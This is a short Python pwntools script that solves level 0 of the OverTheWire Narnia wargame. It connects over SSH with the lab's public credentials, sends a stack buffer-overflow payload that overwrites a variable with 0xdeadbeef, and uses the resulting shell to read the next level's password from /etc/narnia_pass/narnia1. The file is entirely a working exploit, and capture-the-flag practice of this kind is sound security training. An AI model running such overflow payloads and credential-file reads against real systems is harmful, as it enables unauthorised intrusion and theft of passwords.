#! /usr/bin/env python3
import pwn

s = pwn.ssh('narnia0', 
            'narnia.labs.overthewire.org', 
            password='narnia0',
            port=2226)

p = s.process('/narnia/narnia0')
p.sendline(b"A"*pwn.cyclic_find(0x61616166)+pwn.p32(0xdeadbeef))
p.sendline(b"cat /etc/narnia_pass/narnia1")
p.recvuntil("val: 0xdeadbeef\n")
print(p.recvline())
p.close()
s.close()
